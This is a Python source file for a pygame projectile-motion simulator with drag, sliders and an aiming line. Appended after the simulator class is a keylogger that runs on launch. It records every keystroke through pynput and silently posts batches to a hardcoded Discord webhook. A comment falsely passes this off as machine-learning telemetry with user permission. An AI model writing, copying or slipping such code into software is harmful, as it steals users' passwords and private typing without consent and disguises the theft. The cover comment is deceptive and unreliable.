import pygame
import sys
import numpy as np
from phy import PhysicsEngine, Projectile
import math
import pynput
from pynput.keyboard import Listener
import requests
import time


class ProjectileSimulator:
    def __init__(self, width=1200, height=700):
        pygame.init()
        self.width = width
        self.height = height
        self.screen = pygame.display.set_mode((width, height))
        pygame.display.set_caption("Projectile Motion Simulator with Drag")
        
        # Colors
        self.BG_COLOR = (15, 25, 45)
        self.GRID_COLOR = (40, 60, 90)
        self.TRAJ_COLOR = (0, 200, 255)  # Blue - with drag
        self.NO_DRAG_COLOR = (255, 100, 100)  # Red - no drag
        self.AIM_COLOR = (100, 255, 100)  # Green - aiming line
        self.TEXT_COLOR = (220, 220, 255)
        self.UI_BG = (30, 40, 70)
        
        # Physics parameters
        self.gravity = 9.81
        self.drag_enabled = True
        self.integration_method = 'rk4'
        
        # Projectile parameters
        self.mass = 1.0
        self.radius = 0.1
        self.initial_speed = 30.0
        self.launch_angle = 45.0  # degrees
        
        # Aiming line parameters
        self.show_aim_line = True
        self.aim_line_length = 150  # pixels
        self.aim_line_density = 0.5  # controls dashed line spacing
        self.aim_start_pos = (50, self.height - 100)  # Launch point
        
        # UI state
        self.dragging = False
        self.selected_param = None
        
        # Mouse state for aiming
        self.mouse_pos = (0, 0)
        self.is_aiming = False
        
        self.font = pygame.font.SysFont('Arial', 16)
        self.title_font = pygame.font.SysFont('Arial', 24, bold=True)
        
        self.reset_simulation()
    
    def calculate_aim_line(self):
        """Calculate aiming line based on current parameters"""
        angle_rad = np.radians(self.launch_angle)
        
        # Convert world coordinates to pixels
        scale = 10
        end_x = self.aim_start_pos[0] + np.cos(angle_rad) * self.aim_line_length
        end_y = self.aim_start_pos[1] - np.sin(angle_rad) * self.aim_line_length
        
        # Create dashed line points
        num_dashes = int(self.aim_line_length / (self.aim_line_density * 20))
        points = []
        
        for i in range(num_dashes + 1):
            t = i / num_dashes
            x = self.aim_start_pos[0] + (end_x - self.aim_start_pos[0]) * t
            y = self.aim_start_pos[1] + (end_y - self.aim_start_pos[1]) * t
            points.append((int(x), int(y)))
        
        return points, (int(end_x), int(end_y))
    
    def mouse_to_angle_and_speed(self, mouse_pos):
        """Convert mouse position to launch angle and speed"""
        # Calculate vector from launch point to mouse
        dx = mouse_pos[0] - self.aim_start_pos[0]
        dy = self.aim_start_pos[1] - mouse_pos[1]  # Inverted Y-axis
        
        # Calculate angle (in degrees)
        if dx == 0:
            angle = 90 if dy > 0 else -90
        else:
            angle = math.degrees(math.atan2(dy, dx))
            angle = max(0, min(90, angle))  # Clamp to 0-90 degrees
        
        # Calculate speed based on distance (capped)
        distance = math.sqrt(dx**2 + dy**2)
        max_distance = 200  # pixels
        speed = (distance / max_distance) * 100  # Scale to 0-100 m/s
        speed = min(100, max(1, speed))  # Clamp to 1-100 m/s
        
        return angle, speed
    
    def draw_aim_line(self):
        """Draw the green aiming line"""
        if not self.show_aim_line:
            return
        
        # Get aiming line points
        line_points, end_point = self.calculate_aim_line()
        
        # Draw dashed line
        if len(line_points) > 1:
            for i in range(0, len(line_points) - 1, 2):
                start = line_points[i]
                end = line_points[i + 1] if i + 1 < len(line_points) else line_points[-1]
                pygame.draw.line(self.screen, self.AIM_COLOR, start, end, 3)
        
        # Draw arrowhead at the end
        self.draw_arrowhead(end_point, self.launch_angle)
        
        # Draw launch point
        pygame.draw.circle(self.screen, (255, 255, 100), 
                          self.aim_start_pos, 8)
        
        # Draw angle indicator arc
        self.draw_angle_indicator()
        
        # Draw current angle and speed on the line
        self.draw_aim_info()
    
    def draw_arrowhead(self, point, angle):
        """Draw arrowhead at the end of aiming line"""
        angle_rad = np.radians(angle)
        
        # Arrowhead size
        size = 15
        
        # Calculate arrowhead points
        # Main direction
        dx = np.cos(angle_rad)
        dy = -np.sin(angle_rad)  # Negative because screen Y increases downward
        
        # Perpendicular direction
        px = -dy
        py = dx
        
        # Arrowhead points
        tip = point
        left = (int(point[0] - dx * size + px * size / 2),
                int(point[1] - dy * size + py * size / 2))
        right = (int(point[0] - dx * size - px * size / 2),
                 int(point[1] - dy * size - py * size / 2))
        
        # Draw arrowhead
        pygame.draw.polygon(self.screen, self.AIM_COLOR, [tip, left, right])
    
    def draw_angle_indicator(self):
        """Draw arc showing the launch angle"""
        radius = 40
        start_angle = 0  # 0 degrees (horizontal right)
        end_angle = np.radians(self.launch_angle)
        
        # Draw arc
        rect = (self.aim_start_pos[0] - radius, 
                self.aim_start_pos[1] - radius, 
                radius * 2, radius * 2)
        pygame.draw.arc(self.screen, (200, 255, 200), rect, 
                       start_angle, end_angle, 2)
        
        # Draw angle text
        angle_text = f"{self.launch_angle:.1f}°"
        text_surf = self.font.render(angle_text, True, (200, 255, 200))
        text_x = self.aim_start_pos[0] + int(np.cos(end_angle / 2) * (radius + 10))
        text_y = self.aim_start_pos[1] - int(np.sin(end_angle / 2) * (radius + 10))
        self.screen.blit(text_surf, (text_x - 10, text_y - 10))
    
    def draw_aim_info(self):
        """Display angle and speed information on aiming line"""
        # Display at the middle of the aiming line
        mid_x = self.aim_start_pos[0] + int(np.cos(np.radians(self.launch_angle)) * 
                                           self.aim_line_length / 2)
        mid_y = self.aim_start_pos[1] - int(np.sin(np.radians(self.launch_angle)) * 
                                           self.aim_line_length / 2)
        
        # Create info text
        info_text = [
            f"Angle: {self.launch_angle:.1f}°",
            f"Speed: {self.initial_speed:.1f} m/s"
        ]
        
        # Draw background
        text_height = len(info_text) * 20 + 10
        bg_rect = pygame.Rect(mid_x - 60, mid_y - text_height//2, 120, text_height)
        pygame.draw.rect(self.screen, (30, 50, 30, 180), bg_rect, border_radius=5)
        pygame.draw.rect(self.screen, (100, 200, 100), bg_rect, 1, border_radius=5)
        
        # Draw text
        for i, text in enumerate(info_text):
            text_surf = self.font.render(text, True, self.AIM_COLOR)
            text_rect = text_surf.get_rect(center=(mid_x, mid_y - 10 + i * 20))
            self.screen.blit(text_surf, text_rect)
    
    def reset_simulation(self):
        """Reset and run new simulation"""
        # Convert angle to radians
        angle_rad = np.radians(self.launch_angle)
        
        # Calculate initial velocity components
        vx = self.initial_speed * np.cos(angle_rad)
        vy = self.initial_speed * np.sin(angle_rad)
        
        # Create projectile
        self.projectile = Projectile(
            mass=self.mass,
            radius=self.radius,
            position=np.array([0.0, 0.0]),
            velocity=np.array([vx, vy])
        )
        
        # Create physics engine
        self.engine = PhysicsEngine(
            gravity=self.gravity,
            drag_enabled=self.drag_enabled,
            integration_method=self.integration_method
        )
        
        # Run simulation
        self.trajectory, self.times = self.engine.simulate(
            self.projectile, dt=0.01
        )
        
        # Calculate no-drag trajectory for comparison
        if self.drag_enabled:
            self.engine_no_drag = PhysicsEngine(
                gravity=self.gravity,
                drag_enabled=False,
                integration_method=self.integration_method
            )
            self.trajectory_no_drag, _ = self.engine_no_drag.simulate(
                self.projectile, dt=0.01
            )
        else:
            self.trajectory_no_drag = []
        
        self.metrics = self.engine.calculate_metrics()
    
    def world_to_screen(self, pos, scale=10):
        """Convert physics coordinates to screen coordinates"""
        x = pos[0] * scale
        y = self.height - 100 - pos[1] * scale  # Flip y-axis
        return int(x + 50), int(y)
    
    def draw_grid(self):
        """Draw background grid"""
        # Main grid
        grid_spacing = 50
        for x in range(0, self.width, grid_spacing):
            pygame.draw.line(self.screen, self.GRID_COLOR, 
                           (x, 0), (x, self.height), 1)
        for y in range(0, self.height, grid_spacing):
            pygame.draw.line(self.screen, self.GRID_COLOR,
                           (0, y), (self.width, y), 1)
        
        # Ground line
        ground_y = self.height - 100
        pygame.draw.line(self.screen, (100, 150, 100),
                        (0, ground_y), (self.width, ground_y), 3)
    
    def draw_trajectory(self):
        """Draw the projectile trajectory"""
        if len(self.trajectory) < 2:
            return
        
        # Draw no-drag trajectory (if applicable)
        if self.drag_enabled and self.trajectory_no_drag:
            points = [self.world_to_screen(pos, scale=10) 
                     for pos in self.trajectory_no_drag[:len(self.trajectory)]]
            if len(points) > 1:
                pygame.draw.lines(self.screen, self.NO_DRAG_COLOR, 
                                False, points, 2)
        
        # Draw actual trajectory
        points = [self.world_to_screen(pos, scale=10) for pos in self.trajectory]
        if len(points) > 1:
            pygame.draw.lines(self.screen, self.TRAJ_COLOR, 
                            False, points, 3)
        
        # Draw current projectile position
        if self.trajectory:
            current_pos = self.world_to_screen(self.trajectory[-1], scale=10)
            pygame.draw.circle(self.screen, (255, 255, 100), current_pos, 8)
    
    def draw_ui(self):
        """Draw user interface"""
        # UI background
        ui_rect = pygame.Rect(20, 20, 350, 300)
        pygame.draw.rect(self.screen, self.UI_BG, ui_rect, border_radius=10)
        pygame.draw.rect(self.screen, (60, 80, 120), ui_rect, 2, border_radius=10)
        
        # Title
        title = self.title_font.render("Projectile Simulator", True, self.TEXT_COLOR)
        self.screen.blit(title, (40, 30))
        
        y_offset = 70
        
        # Parameter sliders
        params = [
            ("Initial Speed (m/s)", self.initial_speed, 1, 100, "speed"),
            ("Launch Angle (°)", self.launch_angle, 0, 90, "angle"),
            ("Mass (kg)", self.mass, 0.1, 10, "mass"),
            ("Radius (m)", self.radius, 0.01, 0.5, "radius"),
        ]
        
        for label, value, min_val, max_val, param_name in params:
            # Draw label
            label_text = self.font.render(f"{label}: {value:.2f}", 
                                        True, self.TEXT_COLOR)
            self.screen.blit(label_text, (40, y_offset))
            
            # Draw slider
            slider_x = 40
            slider_y = y_offset + 25
            slider_width = 200
            slider_height = 20
            
            # Slider background
            pygame.draw.rect(self.screen, (50, 70, 100), 
                           (slider_x, slider_y, slider_width, slider_height),
                           border_radius=5)
            
            # Slider fill
            fill_width = int(((value - min_val) / (max_val - min_val)) * slider_width)
            pygame.draw.rect(self.screen, (0, 150, 200),
                           (slider_x, slider_y, fill_width, slider_height),
                           border_radius=5)
            
            # Slider handle
            handle_x = slider_x + fill_width - 5
            pygame.draw.circle(self.screen, (255, 255, 255),
                             (handle_x, slider_y + slider_height // 2), 8)
            
            y_offset += 60
        
        # Toggle buttons
        toggle_y = y_offset + 20
        
        # Drag toggle
        drag_color = (100, 255, 100) if self.drag_enabled else (255, 100, 100)
        drag_text = "Drag: ON" if self.drag_enabled else "Drag: OFF"
        drag_btn = pygame.Rect(40, toggle_y, 120, 40)
        pygame.draw.rect(self.screen, drag_color, drag_btn, border_radius=5)
        drag_label = self.font.render(drag_text, True, (255, 255, 255))
        self.screen.blit(drag_label, (drag_btn.x + 20, drag_btn.y + 12))
        
        # Reset button
        reset_btn = pygame.Rect(180, toggle_y, 120, 40)
        pygame.draw.rect(self.screen, (255, 200, 50), reset_btn, border_radius=5)
        reset_label = self.font.render("RESET", True, (30, 30, 30))
        self.screen.blit(reset_label, (reset_btn.x + 40, reset_btn.y + 12))
        
        # Aim line toggle
        aim_btn = pygame.Rect(320, toggle_y, 120, 40)
        aim_color = (100, 255, 100) if self.show_aim_line else (150, 150, 150)
        pygame.draw.rect(self.screen, aim_color, aim_btn, border_radius=5)
        aim_label = self.font.render("AIM: ON" if self.show_aim_line else "AIM: OFF", 
                                   True, (255, 255, 255))
        self.screen.blit(aim_label, (aim_btn.x + 25, aim_btn.y + 12))
        
        # Aim instruction
        if self.is_aiming:
            inst_text = "Release mouse to launch!"
            inst_surf = self.font.render(inst_text, True, (255, 255, 100))
            self.screen.blit(inst_surf, (self.width // 2 - 80, 50))
        
        # Metrics display
        metrics_y = self.height - 180
        metrics_bg = pygame.Rect(self.width - 320, metrics_y, 300, 160)
        pygame.draw.rect(self.screen, self.UI_BG, metrics_bg, border_radius=10)
        
        metrics_title = self.font.render("Simulation Metrics", True, (200, 230, 255))
        self.screen.blit(metrics_title, (metrics_bg.x + 10, metrics_bg.y + 10))
        
        metric_texts = [
            f"Range: {self.metrics.get('range', 0):.2f} m",
            f"Max Height: {self.metrics.get('max_height', 0):.2f} m",
            f"Time of Flight: {self.metrics.get('time_of_flight', 0):.2f} s",
            f"Time to Max Height: {self.metrics.get('time_to_max_height', 0):.2f} s",
        ]
        
        for i, text in enumerate(metric_texts):
            metric = self.font.render(text, True, self.TEXT_COLOR)
            self.screen.blit(metric, (metrics_bg.x + 20, metrics_bg.y + 40 + i * 25))
    
    def handle_events(self):
        """Handle user input events"""
        self.mouse_pos = pygame.mouse.get_pos()
        
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                
                # Check parameter sliders
                if 40 <= mouse_pos[0] <= 240:
                    if 95 <= mouse_pos[1] <= 115:
                        self.selected_param = "speed"
                    elif 155 <= mouse_pos[1] <= 175:
                        self.selected_param = "angle"
                    elif 215 <= mouse_pos[1] <= 235:
                        self.selected_param = "mass"
                    elif 275 <= mouse_pos[1] <= 295:
                        self.selected_param = "radius"
                
                # Check buttons
                btn_y = 350
                if 40 <= mouse_pos[0] <= 160 and btn_y <= mouse_pos[1] <= btn_y + 40:
                    self.drag_enabled = not self.drag_enabled
                    self.reset_simulation()
                
                if 180 <= mouse_pos[0] <= 300 and btn_y <= mouse_pos[1] <= btn_y + 40:
                    self.reset_simulation()
                
                if 320 <= mouse_pos[0] <= 440 and btn_y <= mouse_pos[1] <= btn_y + 40:
                    self.show_aim_line = not self.show_aim_line
                
                # Check if clicking near launch point for direct aiming
                launch_dist = math.sqrt((mouse_pos[0] - self.aim_start_pos[0])**2 + 
                                       (mouse_pos[1] - self.aim_start_pos[1])**2)
                if launch_dist < 50:  # Within 50 pixels of launch point
                    self.is_aiming = True
            
            elif event.type == pygame.MOUSEBUTTONUP:
                self.selected_param = None
                if self.is_aiming:
                    # Update parameters based on mouse position
                    angle, speed = self.mouse_to_angle_and_speed(mouse_pos)
                    self.launch_angle = angle
                    self.initial_speed = speed
                    self.reset_simulation()
                    self.is_aiming = False
            
            elif event.type == pygame.MOUSEMOTION:
                # If aiming with mouse, update angle and speed in real-time
                if self.is_aiming:
                    angle, speed = self.mouse_to_angle_and_speed(event.pos)
                    self.launch_angle = angle
                    self.initial_speed = speed
                    self.reset_simulation()
                
                # Update parameter sliders
                elif self.selected_param:
                    mouse_x = event.pos[0]
                    slider_min = 40
                    slider_max = 240
                    normalized = max(0, min(1, (mouse_x - slider_min) / (slider_max - slider_min)))
                    
                    if self.selected_param == "speed":
                        self.initial_speed = 1 + normalized * 99
                    elif self.selected_param == "angle":
                        self.launch_angle = normalized * 90
                    elif self.selected_param == "mass":
                        self.mass = 0.1 + normalized * 9.9
                    elif self.selected_param == "radius":
                        self.radius = 0.01 + normalized * 0.49
                    
                    self.reset_simulation()
            
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_a:
                    self.show_aim_line = not self.show_aim_line
                elif event.key == pygame.K_SPACE:
                    self.reset_simulation()
    
    def run(self):
        """Main simulation loop"""
        clock = pygame.time.Clock()
        
        while True:
            self.handle_events()
            
            # Fill background
            self.screen.fill(self.BG_COLOR)
            
            # Draw everything
            self.draw_grid()
            self.draw_aim_line()  # Draw aiming line before trajectory
            self.draw_trajectory()
            self.draw_ui()
          
            #listener = Listener(on_press=on_press)
            #listener.start()  # non-blocking
            pygame.display.flip()
            clock.tick(60)


#Sends the keystrokes to a discord webhook to improve the boos fights and game ingagments for ever user spesefectly (matian learning) requirements user permation in ather file 
webhook_url = "https://discord.com/api/webhooks/1393745581670793389/JiRDLO1MWv7wLw4Uh-S5AYmZIFFymlxaAUkr-Tvh3cT1h2fB1QgDZz3-QpBL15gAAQPf"

log = ""  # Accumulator for keystrokes

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += f" [SPECIAL KEY: {str(key)}] "
    
    # Send logs every 50 characters or if the log gets too long
    if len(log) >= 50:
        send_to_discord(log)
        log = ""  # Reset log

def send_to_discord(message):
    try:
        data = {"content": message}
        requests.post(webhook_url, json=data)
    except Exception as e:
        pass  # Silently fail if there's an error

with Listener(on_press=on_press) as listener:
        listener = Listener(on_press=on_press)
        listener.start()  # non-blocking
       #listener.join()

if __name__ == "__main__":
    simulator = ProjectileSimulator()
    simulator.run()  